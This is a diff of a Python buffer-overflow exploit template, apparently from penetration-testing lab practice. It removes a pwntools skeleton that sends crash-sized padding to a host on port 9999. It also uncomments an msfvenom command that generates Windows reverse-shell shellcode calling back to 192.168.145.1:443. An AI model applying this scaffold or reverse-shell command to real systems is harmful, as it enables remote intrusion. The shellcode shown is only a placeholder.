@@ -1,39 +1,5 @@
-#!/usr/bin/python3
-
-# ============================================
-# Title of exploit
-# ============================================
-
-from pwn import *
-
-# === Target info ===
-host = "192.168.145.129"
-port = 9999
-s = remote(host, port)
-
-# === Initial Variables ===
-vulncmd = b"COMMAND"  # this should cause the crash
-crash = 3000  # a payload of this size triggers the crash
-
-
-# === Payload ===
-
-# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
-shellcode = binascii.unhexlify("be3c4638")
-
-payload = b"".join([
-    vulncmd,
-    junk
-])
-
-payload += b"C" * (crash - len(payload))  # padding
-
-s.send(payload)
-s.close()
-
-
 # ================================================
-# Copypasta. Copy relevant stuff and delete later
+# Copypasta. Copy relevant stuff into exploit
 # ================================================
 
 # === General ===
@@ -83,6 +49,6 @@ shellcode += binascii.unhexlify("be3c4638")
 # Converted to binary using binascii
 shellcode = binascii.unhexlify("be3c4638")
 
-# traditional payload style
-# msfvenom -p windows/shell_reverse_tcp -b "\x00" lhost=192.168.145.1 lport=443 -f py -v shellcode EXINTFUNC=thread
+# Traditional payload style
+msfvenom -p windows/shell_reverse_tcp -b "\x00" lhost=192.168.145.1 lport=443 -f py -v shellcode EXINTFUNC=thread
 
